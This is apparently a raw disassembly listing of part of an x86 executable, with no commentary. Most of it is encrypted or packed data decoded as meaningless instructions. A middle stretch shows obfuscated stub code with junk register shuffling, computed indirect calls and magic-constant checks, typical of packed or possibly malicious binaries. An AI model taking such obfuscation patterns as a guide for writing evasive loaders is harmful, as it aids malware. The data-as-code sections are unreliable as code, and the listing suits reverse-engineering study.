  40cd6c:	xchg   DWORD PTR [ebp+ecx*4-0x6ea1f905],edx
  40cd73:	outs   dx,BYTE PTR ds:[esi]
  40cd74:	xor    BYTE PTR [ebx+0x43470060],ch
  40cd7a:	jecxz  0x40cdc2
  40cd7c:	loop   0x40cd4a
  40cd7e:	aas    
  40cd7f:	shl    BYTE PTR [ecx+0x72],0xcf
  40cd83:	pop    ebx
  40cd84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd85:	pop    eax
  40cd86:	mov    ebx,0x2d1ab12d
  40cd8b:	pop    eax
  40cd8c:	cwde   
  40cd8d:	jae    0x40cd3d
  40cd8f:	jge    0x40cd9a
  40cd91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd92:	sbb    DWORD PTR [edx+0x57],ecx
  40cd95:	pushf  
  40cd96:	pop    ebx
  40cd97:	sub    cl,0xb4
  40cd9a:	sbb    BYTE PTR [ebx+0x5],al
  40cd9d:	cs fcmovne st,st(1)
  40cda0:	and    al,0x5b
  40cda2:	shl    ebx,1
  40cda4:	fisubr WORD PTR [edi-0xf]
  40cda7:	cs add al,0x99
  40cdaa:	sbb    BYTE PTR [esi+0x658866b7],dl
  40cdb0:	imul   esi,DWORD PTR es:[eax],0x5e051dde
  40cdb7:	dec    ebp
  40cdb8:	inc    ebp
  40cdb9:	mov    esp,0x1545fe93
  40cdbe:	pushf  
  40cdbf:	xchg   esi,eax
  40cdc0:	or     DWORD PTR [edi],ebp
  40cdc2:	fwait
  40cdc3:	xor    eax,0xc828ab01
  40cdc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc9:	lods   al,BYTE PTR ds:[esi]
  40cdca:	dec    edi
  40cdcb:	sub    BYTE PTR [edi-0xe1dd9ed],al
  40cdd1:	cwde   
  40cdd2:	add    dl,BYTE PTR [eax]
  40cdd4:	sti    
  40cdd5:	mov    ds,WORD PTR [edi-0x5354202a]
  40cddb:	arpl   WORD PTR [edx],sp
  40cddd:	add    ah,dh
  40cddf:	enter  0x8b9a,0xf
  40cde3:	push   0xffffffa6
  40cde5:	gs gs in eax,dx
  40cde8:	sub    eax,eax
  40cdea:	dec    ebx
  40cdeb:	ss test ecx,edx
  40cdee:	push   0xfffffff0
  40cdf0:	ins    BYTE PTR es:[edi],dx
  40cdf1:	add    DWORD PTR [esi+0x41d55983],edi
  40cdf7:	ins    DWORD PTR es:[edi],dx
  40cdf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf9:	xor    ah,ah
  40cdfb:	jo     0x40cdea
  40cdfd:	push   eax
  40cdfe:	mov    eax,ds:0x13241c70
  40ce03:	xlat   BYTE PTR ds:[ebx]
  40ce04:	add    edi,DWORD PTR [ebx+eiz*2]
  40ce07:	push   esp
  40ce08:	lods   al,BYTE PTR ds:[esi]
  40ce09:	mov    ch,0x2a
  40ce0b:	jb     0x40cd9b
  40ce0d:	ss mov dl,ah
  40ce10:	icebp  
  40ce11:	inc    ebx
  40ce12:	pop    ss
  40ce13:	mov    ch,0x42
  40ce15:	ss pop ebx
  40ce17:	xchg   DWORD PTR [ecx+0x12],esp
  40ce1a:	jle    0x40cdef
  40ce1c:	inc    ebx
  40ce1d:	lock (bad) 
  40ce1f:	jae    0x40ce62
  40ce21:	mov    esi,0x38a35beb
  40ce26:	fsubr  st,st(0)
  40ce28:	fimul  WORD PTR [ecx-0x445d2d30]
  40ce2e:	repz xchg ebp,eax
  40ce30:	xchg   ebp,eax
  40ce31:	cmp    eax,0x7503a7f4
  40ce36:	adc    eax,0x4cf434df
  40ce3b:	rol    DWORD PTR [eax+0x16],0xf7
  40ce3f:	jb     0x40cdf2
  40ce41:	jmp    0x2ba81b35
  40ce46:	lds    edi,FWORD PTR [ebx]
  40ce48:	enter  0x840f,0x71
  40ce4c:	add    BYTE PTR [eax],al
  40ce4e:	add    BYTE PTR [ebx+0x458bec7d],cl
  40ce54:	or     BYTE PTR [ebx+0x448b1455],cl
  40ce5a:	add    BYTE PTR [ecx+edi*4],0x93
  40ce5e:	or     BYTE PTR [ecx+0x7],dl
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c56
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42385a
  40cf91:	push   0x423812
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a76
  40cff7:	mov    ebx,DWORD PTR ds:0x421a9e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c56
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cda
  40d0ed:	mov    esi,DWORD PTR ds:0x421cd2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421cd2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	adc    bl,BYTE PTR [eax-0x48]
  40d114:	call   0x62a3a2db
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx-0x77]
  40d11e:	mov    ecx,0xbf6817c6
  40d123:	sahf   
  40d124:	cwde   
  40d125:	in     eax,dx
  40d126:	sbb    DWORD PTR [edi-0x30],ebx
  40d129:	hlt    
  40d12a:	test   eax,0x2cbca340
  40d12f:	or     BYTE PTR gs:[edi+0x42],0x1f
  40d134:	sub    DWORD PTR [edi+0x8b52e66],esi
  40d13a:	test   BYTE PTR [eax+0x10],ah
  40d13d:	ds cmc 
  40d13f:	mov    al,ds:0x3692e3b3
  40d144:	aad    0xd5
  40d146:	adc    ecx,esp
  40d148:	mov    esi,0xb88bcbc2
  40d14d:	jb     0x40d1b4
  40d14f:	xchg   DWORD PTR [ecx-0x40],esi
  40d152:	das    
  40d153:	fwait
  40d154:	mov    esp,0xde75776f
  40d159:	cld    
  40d15a:	mov    dh,0x17
  40d15c:	or     cl,BYTE PTR [ebx+0x2480bbec]
  40d162:	cwde   
  40d163:	in     al,dx
  40d164:	lds    eax,FWORD PTR [esi]
  40d166:	mov    cl,0x55
  40d168:	and    BYTE PTR [eax],ah
  40d16a:	push   ecx
  40d16b:	xor    ah,BYTE PTR [edi+0x3e]
  40d16e:	and    ecx,esp
  40d170:	adc    ecx,DWORD PTR ds:0xe4b51bcb
  40d176:	(bad)  
  40d177:	sahf   
  40d178:	out    dx,al
  40d179:	mov    cl,BYTE PTR [ebx-0x50]
  40d17c:	xor    edx,DWORD PTR [eax+0x8]
  40d17f:	inc    ecx
  40d180:	xchg   DWORD PTR [ebx+0x7bf0e918],esp
  40d186:	mov    dl,0x11
  40d188:	stc    
  40d189:	mov    es,WORD PTR [ebx]
  40d18b:	dec    ecx
  40d18c:	push   ds
  40d18d:	scas   al,BYTE PTR es:[edi]
  40d18e:	repz test DWORD PTR [edx],esp
  40d191:	es adc DWORD PTR ds:[eax+0x7d],esp
  40d196:	cmp    esi,eax
  40d198:	scas   ax,WORD PTR es:[edi]
  40d19a:	stos   BYTE PTR es:[edi],al
  40d19b:	(bad)
  40d19e:	mov    dl,0x99
  40d1a0:	sahf   
  40d1a1:	scas   al,BYTE PTR es:[edi]
  40d1a2:	add    esp,edi
  40d1a4:	inc    edi
  40d1a5:	retf   0x2ba6
  40d1a8:	or     DWORD PTR [esi+ecx*8-0x57],ecx
  40d1ac:	(bad)  
  40d1ad:	xor    DWORD PTR [ecx-0x64],edi
  40d1b0:	mov    edx,edx
  40d1b2:	je     0x40d18c
  40d1b4:	push   esi
  40d1b5:	test   BYTE PTR [ecx-0x74],ch
  40d1b8:	dec    ebp
  40d1b9:	in     al,dx
  40d1ba:	adc    ebp,edx
  40d1bc:	out    0x5c,eax
  40d1be:	scas   eax,DWORD PTR es:[edi]
  40d1bf:	adc    ebx,esi
  40d1c1:	and    eax,0x1d2fa83
  40d1c6:	jns    0x40d171
  40d1c8:	cmp    DWORD PTR [edi-0x4ca84ea3],esi
  40d1ce:	test   edi,edi
  40d1d0:	scas   al,BYTE PTR es:[edi]
  40d1d1:	or     BYTE PTR [edx+esi*2-0x1a35c2fd],bl
  40d1d8:	into   
  40d1d9:	add    edi,0xd0ca0290
  40d1df:	int3   
  40d1e0:	stos   DWORD PTR es:[edi],eax
  40d1e1:	push   edx
  40d1e2:	mov    ebp,0xbce425ba
  40d1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1e8:	push   es
  40d1e9:	dec    esp
  40d1ea:	jne    0x40d245
  40d1ec:	add    eax,0x53b1c69
  40d1f1:	imul   edx,DWORD PTR [ecx+0x34],0x33dc64c5
  40d1f8:	dec    ecx
  40d1f9:	xchg   BYTE PTR [edi+0x4ccefef5],bl
  40d1ff:	push   es
  40d200:	xor    BYTE PTR [edx],ah
  40d202:	mov    esp,0xf5eb435f
  40d207:	aam    0x68
  40d209:	shl    al,1
  40d20b:	pop    ds
  40d20c:	ins    DWORD PTR es:[edi],dx
  40d20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d20e:	fldenv [edx]
  40d210:	daa    
  40d211:	mov    ah,0x51
  40d213:	addr16 xchg edi,eax
  40d215:	test   dl,ah
  40d217:	(bad)  
  40d218:	pop    edx
  40d219:	push   esp
  40d21a:	out    0x66,al
  40d21c:	push   ecx
  40d21d:	dec    edi
  40d21e:	push   esp
  40d21f:	imul   esi,DWORD PTR [eax+0x166ac7b5],0xffffffd8
  40d226:	sbb    eax,DWORD PTR [eax]
  40d228:	aaa    
  40d229:	dec    esi
  40d22a:	call   0xe2eb93c1
  40d22f:	(bad)  
  40d230:	ins    BYTE PTR es:[edi],dx
  40d231:	ret    0x964e
  40d234:	mov    cl,BYTE PTR [edi]
  40d236:	cmc    
  40d237:	in     al,0x71
  40d239:	push   0xffffff9f
  40d23b:	cmc    
  40d23c:	dec    esi
  40d23d:	out    0x48,al
  40d23f:	(bad)  
  40d240:	mov    cs:0xb9c7a58e,eax
  40d246:	and    edi,DWORD PTR [edi+0x6a]
  40d249:	push   cs
  40d24a:	pop    ss
  40d24b:	fsubr  QWORD PTR [eax]
  40d24d:	pop    esi
  40d24e:	(bad)  
  40d24f:	inc    eax
  40d250:	test   DWORD PTR [ecx+eax*1+0x369e3b0e],edx
  40d257:	push   eax
  40d258:	cld    
  40d259:	retf   0x2a4c
  40d25c:	mov    eax,0x80230f3
  40d261:	cmc    
  40d262:	inc    ecx
  40d263:	add    al,0xe2
  40d265:	cmp    eax,0x40773276
  40d26a:	or     bl,BYTE PTR [ecx+0x53]
  40d26d:	cmc    
  40d26e:	(bad)  
  40d26f:	aad    0xd
  40d271:	(bad)  
  40d272:	clc    
  40d273:	jb     0x40d2e9
  40d275:	call   DWORD PTR [eax-0x78]
  40d278:	mov    ecx,0x95dc37c6
  40d27d:	test   BYTE PTR [edi],cl
  40d27f:	out    dx,al
  40d280:	popf   
  40d281:	cmp    ebp,ebp
  40d283:	xor    BYTE PTR [ebp-0x66],0x21
  40d287:	dec    ebp
  40d288:	xor    al,0xea
  40d28a:	mov    al,ds:0xc315ee6c
  40d28f:	cmp    DWORD PTR [ecx+0x76],ebx
  40d292:	imul   sp,WORD PTR [ecx-0x690bb81e],0x2730
  40d29b:	arpl   WORD PTR [eax],bp
  40d29d:	stos   BYTE PTR es:[edi],al
  40d29e:	jbe    0x40d268
  40d2a0:	(bad)  
  40d2a1:	into   
  40d2a2:	(bad)  
  40d2a3:	mov    DWORD PTR [eax],esp
  40d2a5:	pushf  
  40d2a6:	repz jbe 0x40d2ef
  40d2a9:	sbb    BYTE PTR [esi-0x6241a4e],cl
  40d2af:	mov    ss,WORD PTR [edx+0x368490f6]
  40d2b5:	cwde   
  40d2b6:	push   0x620b532d
  40d2bb:	es repnz dec ebp
  40d2be:	stos   DWORD PTR es:[edi],eax
  40d2bf:	outs   dx,BYTE PTR ds:[esi]
  40d2c0:	push   ds
  40d2c1:	sahf   
  40d2c2:	mov    bl,0x84
  40d2c4:	fldcw  WORD PTR [edi]
  40d2c6:	rcr    DWORD PTR [ebx+0x12],cl
  40d2c9:	jl     0x40d2b4
  40d2cb:	in     eax,0x7f
  40d2cd:	mov    bl,0xc
  40d2cf:	sti    
  40d2d0:	imul   ebx,DWORD PTR [eax]
  40d2d3:	xchg   esi,eax
  40d2d4:	repnz pushf 
  40d2d6:	xchg   edx,eax
  40d2d7:	sbb    al,0x65
  40d2d9:	call   0x4f06f3f3
  40d2de:	test   DWORD PTR [eax-0x8],edx
  40d2e1:	jge    0x40d2cf
  40d2e3:	xlat   BYTE PTR ds:[ebx]
  40d2e4:	pop    ss
  40d2e5:	push   esi
  40d2e6:	aam    0x23
  40d2e8:	pop    eax
  40d2e9:	test   cl,0xc7
  40d2ec:	mov    al,ds:0xefc50fea
  40d2f1:	(bad)  
  40d2f2:	jge    0x40d2ec
  40d2f4:	cli    
  40d2f5:	ret    
  40d2f6:	dec    esp
  40d2f7:	sbb    cl,bh
  40d2f9:	push   eax
  40d2fa:	push   es
  40d2fb:	mov    ebx,0x1d1a9317
  40d300:	jl     0x40d2dd
  40d302:	test   DWORD PTR [edx+0x5a],ecx
  40d305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d306:	jmp    0x1a4b:0x157c31eb
  40d30d:	sub    BYTE PTR [esi+edi*1-0x61909a9d],bh
  40d314:	mov    edi,0x3ef01dd2
  40d319:	fsincos 
  40d31b:	add    ch,BYTE PTR [eax-0x60]
  40d31e:	and    BYTE PTR [ecx+ebx*1],dl
  40d321:	add    eax,0xbc32f12f
  40d326:	enter  0x80c,0xa6
  40d32a:	(bad)  
  40d32b:	repnz leave 
  40d32d:	pop    eax
  40d32e:	shl    DWORD PTR [edi-0x1248c22e],cl
  40d334:	inc    esp
  40d335:	sbb    dh,BYTE PTR [ebp+0x34]
  40d338:	xor    dl,BYTE PTR [ebx-0x30]
  40d33b:	mov    ecx,0x3e944c83
  40d340:	fdivr  DWORD PTR [edi-0x49820ce5]
  40d346:	in     eax,0x63
  40d348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d349:	push   esi
  40d34a:	xchg   edx,eax
  40d34b:	pop    ecx
  40d34c:	mov    ebp,0x6f9d59c
  40d351:	mov    ebp,0x1ec241a4
  40d356:	lods   al,BYTE PTR ds:[esi]
  40d357:	fstp   DWORD PTR [ecx]
  40d359:	out    dx,eax
  40d35a:	sbb    dh,cl
  40d35c:	push   esi
  40d35d:	pop    ebp
  40d35e:	or     al,0x47
  40d360:	loop   0x40d38c
  40d362:	pop    ecx
  40d363:	cmc    
  40d364:	or     ebp,DWORD PTR [edi+ebx*1]
  40d367:	ret    
  40d368:	inc    esp
  40d369:	add    BYTE PTR [edi-0x4f],dh
  40d36c:	or     BYTE PTR [eax+ecx*4],cl
  40d36f:	and    ebp,eax
  40d371:	pop    ds
  40d372:	mov    dl,0x4e
  40d374:	sub    dl,BYTE PTR [esi+0x5a]
  40d377:	pusha  
  40d378:	cdq    
  40d379:	popf   
  40d37a:	jmp    0xe7055232
  40d37f:	stc    
  40d380:	test   DWORD PTR [ecx+0x1c],edx
  40d383:	(bad)  
  40d385:	mov    ds:0x3c894a7f,eax
  40d38a:	fdiv   DWORD PTR [edi+edi*4-0x10f245fa]
  40d391:	ins    DWORD PTR es:[edi],dx
  40d392:	xor    dl,0xdb
  40d395:	cmp    al,0x4b
  40d397:	cmp    esp,DWORD PTR [edx]
  40d399:	std    
  40d39a:	jno    0x40d3a5
  40d39c:	aaa    
  40d39d:	xlat   BYTE PTR ds:[ebx]
  40d39e:	jb     0x40d375
  40d3a0:	dec    ebx
  40d3a1:	aaa    
  40d3a2:	mov    eax,0xe6b2894c
  40d3a7:	hlt    
  40d3a8:	arpl   WORD PTR [esi-0x6b9de9f1],ax
  40d3ae:	mov    eax,0xc8d6df63
  40d3b3:	pop    esp
  40d3b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b5:	add    DWORD PTR [esp+ecx*2],ecx
  40d3b8:	pop    ebx
  40d3b9:	aad    0xa6
  40d3bb:	add    ebp,ebp
  40d3bd:	adc    al,0xc6
  40d3bf:	mov    bl,BYTE PTR [ecx+0x17a8bc4d]
  40d3c5:	cmp    bl,BYTE PTR [eax-0x5944819b]
  40d3cb:	sbb    edx,DWORD PTR fs:[ebp+0x77]
  40d3cf:	inc    esi
  40d3d0:	stos   BYTE PTR es:[edi],al
  40d3d1:	or     BYTE PTR [ebx],0xe4
  40d3d4:	xchg   esi,eax
  40d3d5:	or     edi,DWORD PTR [eax]
  40d3d7:	mov    al,ss:0x1877aaac
  40d3dd:	(bad)  
  40d3de:	mov    cl,0x18
  40d3e0:	sbb    eax,0x2f93f0cc
  40d3e5:	xchg   esp,eax
  40d3e6:	sbb    BYTE PTR [ebp-0x15f8c59d],bh
  40d3ec:	jo     0x40d3fa
  40d3ee:	ja     0x40d383
  40d3f0:	sbb    cl,BYTE PTR [eax-0x2e00303a]
  40d3f6:	add    al,0x7d
  40d3f8:	sbb    DWORD PTR [eax],ecx
  40d3fa:	xchg   ecx,eax
  40d3fb:	pop    eax
  40d3fc:	jg     0x40d473
  40d3fe:	mov    ah,0x8b
  40d400:	call   0xfc086216
  40d405:	xor    BYTE PTR [edi+ecx*2+0x1a6c8b],bl
  40d40c:	icebp  
  40d40d:	sub    DWORD PTR [edi-0x7c],ebx
  40d410:	fwait
  40d411:	cmp    esp,esp
  40d413:	loop   0x40d44b
  40d415:	ss lahf 
  40d417:	or     al,BYTE PTR [edi+ebx*1-0x596d3289]
  40d41e:	cli    
  40d41f:	(bad)
  40d423:	mov    al,0x26
  40d425:	retf   0x18f5
  40d428:	xchg   edx,eax
  40d429:	scas   al,BYTE PTR es:[edi]
  40d42a:	mov    al,ds:0xc3c3a47
  40d42f:	std    
  40d430:	rcpps  xmm1,xmm2
  40d433:	or     eax,0xf0cfe08f
  40d438:	mov    dl,BYTE PTR [ecx+edi*1-0x568d9b77]
  40d43f:	mov    ecx,fs
  40d441:	ficom  DWORD PTR [ecx]
  40d443:	daa    
  40d444:	popa   
  40d445:	and    BYTE PTR [eax-0x56],al
  40d448:	and    esi,ebp
  40d44a:	jg     0x40d3f0
  40d44c:	lods   al,BYTE PTR ds:[esi]
  40d44d:	mov    edx,0x312bb505
  40d452:	fcom   DWORD PTR [edx]
  40d454:	mov    ch,0x68
  40d456:	repz pop edi
  40d458:	(bad)  [edi-0x42fe44e]
  40d45e:	lods   eax,DWORD PTR ds:[esi]
  40d45f:	hlt    
  40d460:	fiadd  DWORD PTR [edx+0x76a5d994]
  40d466:	cmp    DWORD PTR [ecx],ebx
  40d468:	push   cs
  40d469:	(bad)  
  40d46a:	out    0x87,eax
  40d46c:	repz fcomp st(3)
  40d46f:	add    BYTE PTR [edx-0x60],cl
  40d472:	pop    ds
  40d473:	leave  
  40d474:	je     0x40d4be
  40d476:	mov    al,ds:0x249ae44a
  40d47b:	adc    eax,0x67d2e6fc
  40d481:	ds dec eax
  40d483:	mov    bh,0x95
  40d485:	iret   
  40d486:	jnp    0x40d477
  40d488:	mov    ds:0xa4763999,al
  40d48d:	jmp    DWORD PTR fs:[ecx+edx*4+0x2f]
  40d492:	pcmpeqw mm1,QWORD PTR [ecx-0x38]
  40d496:	sbb    dl,BYTE PTR [ebx+0x7f5b29c1]
  40d49c:	mov    ebx,?
  40d49e:	daa    
  40d49f:	push   edi
  40d4a0:	xor    cl,0xf9
  40d4a3:	loop   0x40d4be
  40d4a5:	push   ebx
  40d4a6:	xchg   ebp,eax
  40d4a7:	push   eax
  40d4a8:	xor    ebx,0x2b
  40d4ab:	leave  
  40d4ac:	out    0xe4,al
  40d4ae:	outs   dx,DWORD PTR ds:[esi]
  40d4af:	(bad)  
  40d4b1:	ins    BYTE PTR es:[edi],dx
  40d4b2:	xor    eax,0xcf083f96
  40d4b7:	push   ebx
  40d4b8:	mov    esp,0x73141f
  40d4bd:	imul   edi,DWORD PTR [esp+ebx*8],0xfffffff9
  40d4c1:	xchg   di,ax
  40d4c3:	push   eax
  40d4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4c5:	popa   
  40d4c6:	(bad)  [ebp-0x7e]
  40d4c9:	icebp  
  40d4ca:	sbb    BYTE PTR [eax-0x50b77398],cl
  40d4d0:	jg     0x40d469
  40d4d2:	pop    ds
  40d4d3:	push   cs
  40d4d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d5:	mov    edx,ecx
  40d4d7:	dec    esi
  40d4d8:	fidiv  DWORD PTR [ecx+0xc43bfbf]
  40d4de:	test   DWORD PTR ds:[eax+0x6632fb29],esp
  40d4e5:	adc    al,0x78
  40d4e7:	sbb    eax,0xf5b89727
  40d4ec:	std    
  40d4ed:	mov    dl,0x6e
  40d4ef:	jbe    0x40d494
  40d4f1:	test   DWORD PTR [eiz*8-0x387da6b9],0x11da435e
  40d4fc:	and    ebp,ebp
  40d4fe:	shr    BYTE PTR [eax+0x3f],0x83
  40d502:	mov    edi,0x781010e7
  40d507:	into   
  40d508:	xchg   ebx,eax
  40d509:	jl     0x40d497
  40d50b:	inc    esi
  40d50c:	dec    esi
  40d50d:	ret    
  40d50e:	sub    ah,BYTE PTR es:[edi-0xc]
  40d512:	hlt    
  40d513:	sti    
  40d514:	pop    ebp
  40d515:	xchg   esi,eax
  40d516:	pop    ecx
  40d517:	mov    ch,0xe7
  40d519:	xor    BYTE PTR [ebx],ah
  40d51b:	imul   ecx,DWORD PTR [esi+0x5],0xdc4ca128
  40d522:	test   DWORD PTR [eax+0x28e1a138],0x380a9f1d
  40d52c:	mov    ch,0xd
  40d52e:	xor    eax,0x1e22cdbe
  40d533:	enter  0x20f8,0xd4
  40d537:	sbb    BYTE PTR [edi-0x628705a7],al
  40d53d:	lea    ebp,[eax+0x246278ad]
  40d543:	fwait
  40d544:	sbb    DWORD PTR [esi-0x7a],ecx
  40d547:	xchg   edx,eax
  40d548:	mov    ah,0x58
  40d54a:	push   0x4d
  40d54c:	xchg   esp,eax
  40d54d:	pop    edi
  40d54e:	mov    dl,0x88
  40d550:	pusha  
  40d551:	pop    ebx
  40d552:	pop    ebx
  40d553:	test   eax,0x16d633b0
  40d558:	ss int3 
  40d55a:	lods   al,BYTE PTR ds:[esi]
  40d55b:	dec    ecx
  40d55c:	lahf   
  40d55d:	aad    0x4e
